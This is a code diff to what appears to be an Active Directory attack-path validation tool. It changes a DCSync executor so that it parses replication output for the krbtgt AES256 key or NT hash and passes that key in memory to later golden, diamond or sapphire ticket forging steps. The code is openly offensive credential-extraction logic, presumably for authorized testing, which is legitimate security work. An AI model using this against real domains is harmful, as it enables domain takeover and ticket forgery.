@@ -40,7 +40,7 @@ from ..recommend import ParamSpec, ParamValue, values
 from .. import proof
 from .. import states
 from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
-                   redact_argv)
+                   redact_argv, Capability, CAP_AES_KEY, CAP_NT_HASH)
 from .coercion import _short_name
 
 
@@ -49,6 +49,31 @@ from .coercion import _short_name
 _RE_DCSYNC_KRBTGT = re.compile(
     r"^\s*(?:[^\s:]+[\\/])?krbtgt:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::\s*$",
     re.I | re.M)
+
+# T4b composition: the krbtgt SIGNING KEY, extracted ONLY to thread in-memory to a
+# downstream forging edge (GOLDEN/DIAMOND/SAPPHIRE). AES256 is preferred (what the
+# forge proofs use); the NT hash is the fallback. These values are SECRET and are
+# never captured on the standalone path and never serialized into any receipt /
+# ChainReport -- they ride a CAP_AES_KEY / CAP_NT_HASH capability the engine keeps
+# in-memory only (``base._SECRET_CHANNELS``), exactly like a shadow-creds/relay key.
+_RE_KRBTGT_AES256 = re.compile(
+    r"(?:^|\n)\s*(?:[^\s:]+[\\/])?krbtgt:aes256-cts-hmac-sha1-96:([0-9a-f]{64})\b", re.I)
+_RE_KRBTGT_NT = re.compile(
+    r"(?:^|\n)\s*(?:[^\s:]+[\\/])?krbtgt:\d+:[0-9a-f]{32}:([0-9a-f]{32}):::", re.I)
+
+
+def _extract_krbtgt_signing_key(output: str) -> tuple:
+    """The krbtgt signing key + kind from a DCSync dump, for IN-MEMORY threading
+    only. AES256 wins (``'aes'``); else the NT hash (``'nt'``). ``(None, None)``
+    when neither is present. The caller gates this on the composed path, so the
+    standalone DCSync stays presence-only (never captures the secret)."""
+    m = _RE_KRBTGT_AES256.search(output or "")
+    if m:
+        return m.group(1).lower(), "aes"
+    m = _RE_KRBTGT_NT.search(output or "")
+    if m:
+        return m.group(1).lower(), "nt"
+    return None, None
 
 
 def _krbtgt_target(cfg) -> str:
@@ -193,13 +218,25 @@ class DCSyncExecutor(ValidationExecutor):
         run_env = dict(ctx.env) if ctx.env else None
         res = ctx.runner.run(dcsync_argv, env=run_env,
                              timeout=cfg.tool_timeout_s, cwd=str(out_dir))
+        combined = (res.stdout or "") + "\n" + (res.stderr or "")
         dcsync_ok = bool(res.returncode == 0 and not res.error and not res.timed_out
-                         and _RE_DCSYNC_KRBTGT.search((res.stdout or "") + "\n" + (res.stderr or "")))
+                         and _RE_DCSYNC_KRBTGT.search(combined))
         record("dcsync", dcsync_argv, res, dcsync_ok,
                note="krbtgt replicated" if dcsync_ok else "no replication data")
         if not dcsync_ok:
             errors.append("dcsync_failed")
             return self._artifact(steps, gate, mutation, None, False, errors)
+
+        # T4b: ON THE COMPOSED PATH ONLY, capture the krbtgt signing key IN-MEMORY
+        # so a downstream forging edge (GOLDEN/DIAMOND/SAPPHIRE) can consume it.
+        # Standalone (``composed`` False) stays presence-only -- the secret is never
+        # extracted. The captured value rides an engine-only artifact field that
+        # ``_receipt_from`` DROPS (schema-only), so it never reaches the receipt;
+        # ``produced`` turns it into a secret-channel capability the engine keeps
+        # in-memory and out of every ChainReport.
+        signing_key = signing_kind = None
+        if getattr(ctx, "composed", False):
+            signing_key, signing_kind = _extract_krbtgt_signing_key(combined)
 
         terminal_fact = proof.build_terminal_fact(
             self.terminal_kind, ok=True,
@@ -207,7 +244,21 @@ class DCSyncExecutor(ValidationExecutor):
                        "(success is Domain Admin)"),
             proof_token=proof.proof_token("DCSYNC", cfg.domain, dc_host, "krbtgt_replicated"),
             extra={"dc": _short_name(dc_host), "replicated_object": "krbtgt"})
-        return self._artifact(steps, gate, mutation, terminal_fact, True, errors)
+        artifact = self._artifact(steps, gate, mutation, terminal_fact, True, errors)
+        if signing_key:
+            artifact["_krbtgt_signing_key"] = signing_key    # engine-only; dropped by _receipt_from
+            artifact["_krbtgt_signing_kind"] = signing_kind
+        return artifact
+
+    def produced(self, ctx, finding, params, artifact) -> list:
+        """T4b: thread the recovered krbtgt signing key to a downstream forging
+        edge as a SECRET-channel KRBTGT capability (engine keeps it in-memory,
+        never serialized). Empty unless the composed path captured a real key."""
+        key = artifact.get("_krbtgt_signing_key")
+        if not artifact.get("complete") or not key:
+            return []
+        channel = CAP_AES_KEY if artifact.get("_krbtgt_signing_kind") == "aes" else CAP_NT_HASH
+        return [Capability(state=states.KRBTGT, channel=channel, value=key, principal="krbtgt")]
 
     @staticmethod
     def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
